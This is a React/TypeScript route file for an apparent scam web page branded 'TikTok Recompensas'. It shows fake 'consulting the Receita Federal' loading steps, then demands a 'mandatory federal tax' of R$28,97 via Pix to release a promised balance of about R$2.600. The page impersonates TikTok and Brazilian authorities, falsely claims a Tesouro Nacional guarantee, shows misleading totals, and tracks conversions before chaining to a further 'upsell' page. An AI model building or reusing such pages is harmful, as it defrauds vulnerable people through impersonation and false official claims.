import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { trackEvent } from "@/lib/tracking";
import { PixCheckoutModal } from "@/components/PixCheckoutModal";

export const Route = createFileRoute("/upsell-4")({
  head: () => ({
    meta: [
      { title: "Taxa Federal Obrigatória | TikTok Recompensas" },
      {
        name: "description",
        content:
          "Pague a taxa federal obrigatória de R$28,97 para liberar o total de R$2.597,72 do seu saldo.",
      },
      { property: "og:title", content: "Taxa Federal Obrigatória | TikTok Recompensas" },
      {
        property: "og:description",
        content: "Liberação do saldo mediante pagamento da taxa federal de R$28,97.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Upsell4,
});

function TikTokLogo() {
  return (
    <header className="flex h-14 items-center justify-center border-b border-border bg-background">
      <span className="flex items-center gap-1.5 text-xl font-extrabold tracking-tight text-foreground">
        <svg viewBox="0 0 24 24" className="h-6 w-6" aria-hidden="true">
          <path
            fill="currentColor"
            d="M16.6 5.82A4.28 4.28 0 0 1 15.54 3h-3.09v12.4a2.59 2.59 0 1 1-1.79-2.46V9.8a5.79 5.79 0 1 0 4.88 5.72V9.01a7.35 7.35 0 0 0 4.29 1.38V7.3a4.29 4.29 0 0 1-3.23-1.48Z"
          />
        </svg>
        TikTok
      </span>
    </header>
  );
}

const STEPS = [
  "Verificando dados...",
  "Consultando a Receita Federal...",
  "Validando seu saldo...",
  "Liberando o resumo...",
];

function Upsell4() {
  const [pixOpen, setPixOpen] = useState(false);
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState(0);
  const [progress, setProgress] = useState(10);

  useEffect(() => {
    trackEvent("ViewContent", { content_name: "Upsell 4", currency: "BRL", value: 28.97 });
  }, []);

  useEffect(() => {
    const tick = setInterval(() => {
      setProgress((p) => {
        const next = p + 6;
        if (next >= 100) {
          clearInterval(tick);
          setTimeout(() => setLoading(false), 250);
          return 100;
        }
        setStep(Math.min(STEPS.length - 1, Math.floor(next / 25)));
        return next;
      });
    }, 90);
    return () => clearInterval(tick);
  }, []);

  if (loading) {
    return (
      <div className="flex min-h-screen flex-col bg-background">
        <TikTokLogo />
        <div className="flex flex-1 flex-col items-center justify-center px-8">
          <p className="mb-4 min-h-[22px] text-[15px] font-medium text-foreground transition-all">
            {STEPS[step]}
          </p>
          <div className="h-[5px] w-full max-w-[300px] overflow-hidden rounded-full bg-muted">
            <div
              className="h-full rounded-full bg-[#fe2c55] transition-all duration-150"
              style={{ width: `${progress}%` }}
            />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      <TikTokLogo />

      <main className="mx-auto w-full max-w-md px-4 py-4">
        <div className="flex items-center gap-2 rounded-r-lg border-l-4 border-[#fe2c55] bg-rose-50 px-4 py-3 text-sm font-bold text-foreground">
          <svg viewBox="0 0 24 24" className="h-5 w-5 text-[#fe2c55]" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M12 3 2 20h20L12 3Z" />
            <path d="M12 10v4" />
            <path d="M12 17h.01" />
          </svg>
          Taxa federal obrigatória
        </div>

        <h1 className="mt-5 text-xl font-extrabold text-foreground">
          Imposto Federal sobre Transação Financeira
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          O pagamento da taxa é obrigatório e exigido pela{" "}
          <strong className="font-bold text-foreground">Receita Federal</strong>.
        </p>

        <section className="mt-5 rounded-2xl bg-muted/60 p-5">
          <p className="text-lg font-bold text-foreground">Resumo</p>

          <div className="mt-3 flex items-center justify-between border-t border-border py-3 text-sm">
            <span className="text-muted-foreground">Valor conquistado</span>
            <span className="font-bold text-foreground">R$2.568,75</span>
          </div>
          <div className="flex items-center justify-between border-t border-border py-3 text-sm">
            <span className="text-muted-foreground">Valor a pagar (taxa)</span>
            <span className="font-bold text-[#fe2c55]">- R$28,97</span>
          </div>
          <div className="flex items-center justify-between border-t border-border pt-3 text-base">
            <span className="font-bold text-foreground">Total a receber</span>
            <span className="text-lg font-extrabold text-foreground">R$2.597,72</span>
          </div>
        </section>

        <section className="mt-4 rounded-2xl border border-emerald-100 bg-emerald-50 p-4">
          <p className="flex items-center gap-2 text-sm font-bold text-emerald-800">
            <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2">
              <circle cx="12" cy="12" r="9" />
              <path d="m8.5 12 2.5 2.5 4.5-5" />
            </svg>
            Garantia de pagamento
          </p>
          <p className="mt-2 text-sm text-emerald-700">
            O valor é garantido pelo Tesouro Nacional.
          </p>
        </section>

        <button
          type="button"
          onClick={() => {
            trackEvent("AddToCart", { content_name: "Upsell 4", currency: "BRL", value: 28.97 });
            setPixOpen(true);
          }}
          className="mt-5 flex w-full items-center justify-center gap-2 rounded-xl bg-[#0b3b6f] px-4 py-4 text-base font-bold text-white transition-opacity hover:opacity-90"
        >
          <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="2" y="5" width="20" height="14" rx="2" />
            <path d="M2 10h20" />
          </svg>
          Pagar Taxa
        </button>
      </main>

      <PixCheckoutModal
        open={pixOpen}
        onClose={() => setPixOpen(false)}
        amount={28.97}
        title="Taxa Federal"
        nextRoute="/upsell-5"
        prefillName="Cliente"
        prefillEmail={`cliente+up4${Date.now()}@email.com`}
      />
    </div>
  );
}
